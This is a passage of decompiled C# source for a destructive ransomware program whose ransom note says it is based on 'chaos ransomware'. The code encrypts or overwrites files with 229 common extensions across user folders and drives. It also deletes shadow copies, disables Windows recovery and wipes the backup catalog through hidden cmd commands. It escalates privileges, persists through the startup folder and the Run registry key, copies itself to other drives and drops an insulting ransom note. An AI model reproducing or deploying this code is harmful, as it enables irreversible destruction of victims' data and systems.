NaisILexkDTan37JxRW8bIEZcpczTIw+zA/eZBKUxvlRjPJiCfWrKCe4gE9u4hlki4jKAW4GK5I86H+z97LoUmrRahpk6iyMc13IIpT3cxCyQWl60eeHiZFMLj2kcZ3VmUjEs8s8s08rcUs0jyyNy4nclmO21CxG2XxrKRfEqlmDw32Qs7/B/pmuZ3PqaSDuPX6giuZ3+VefwejyLB3+Vdzy8icUgHf4fSuk/U1GCclvaXJIU535N5Gru2ucgb0IQymNhvscA/wCtW0MzLjehTjgNCQWxXGcb1LSUnrQ3Bdct6sYrnlv6eNBawNRki5XhPmakwxlyMD+VQLYSPgnKr58zVzbjAwBQ2EyPJGFXGP50Ma9oSSCSe3Tc5LoB18RRcEwMmo07KFbON6lcA20zMtKEltqSx7gSK6MD5DIomZEkVkdQ6MMMrDIIqHfR2cWs2nCyrJIjsEHPODuQOhqYKdSe1NmZa1vaQPXlk9jJ3igtbMfZc7lCf1XP0PWurqUcKguyoPEnn6UQ7EEEAgjBBGQR5g0L6/o8nevf2kYMbLm4iTAKMo3dF8D1A8+nLo1xk8Nk+/KMesiZ9euJA0drlF5GZh7X8Cnl6mq4FmJYklmOWLEkk+JJ3/351CWVFG/4V0zsdl9kfjW1p41VL4ezJvlZc/iJkk4TYbt+A9ailixJJJJ3yaazXuL/AEo8p57BRqUeh7ioo0TQY3ayn1M24k1CN30jSbiWW2utTjKkd7FMpCxk/wDxy4IdhjGN6kaH2XtjFZ3t7NZXVzeEDTtN71Gtr0spDW0lwjZ71lLcJTIjIBZgfZrusa1pFvcfarKN59f7mKAajMQFhiRAsc0luRtfKuI5D7oKcQ9pvYWla5vbEMq1HlnO02t21xBFY2k/2l7h4LvVL2SGS3vLlreMw29vfxt7PexDiEhXZjwnmNhT/fWmwWZhgM7uwCgZZ3ZjgADmSTRNH2O1t0jdpbKNmRWZHlk4kJGSrcKEZHI71Z210JKbwVjTZc8wWQRGQRnofzrxr1erJNXPB7O4+NdP5ivV6uLLyczzqxtG7xVydweE/CvV6qT6Jg+S6trdDgs7ei4FXdrDEuOBRnxO5+Zr1epOQ9At4E5ZqxiYIOXSvV6qIK+hq71O3to3aRmAVSThScAbnlQbqPauWYMtgpVTkd/KBxeqJy+fyr1erX9O08Lm3PnBj+oaidKShxkG4riVbyK5d2eTvld3clmY56k0bKcgEciAR6GvV6nvUIpQjj99GbpZNzefkKpEoJjfyGR6jevV6sg0AU1bRwwmvLQKpVXlni2VcKOJnj6eo+XhQ6DivV6j1SYKxJMWDmrbQNXTR777S8KMHRou/WON7mzLAjv7XvQU418xvy2zker1aP8ANHkB5JOqa1ZTpFBp0M5kiuWuP6WvmX+lJSQRwK8AULHuSFy2PHoaQZJ8ScD1J2616vV0VhcFZcvk0LQOzg04peXoV78rmNBhktQfA8i/ienTxJKDsK9Xq8xZZK2W6R6euqNUVGKP/9k=";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "READ_ME_OR_YOUR_GAY.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[2] { "YOU GOT HACKED BY THE PORN VIRUS! (chaos ransomware based)", "THERE IS NO ESCAPE, ALL YOU FILES ARE OVERWRITTEN!" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
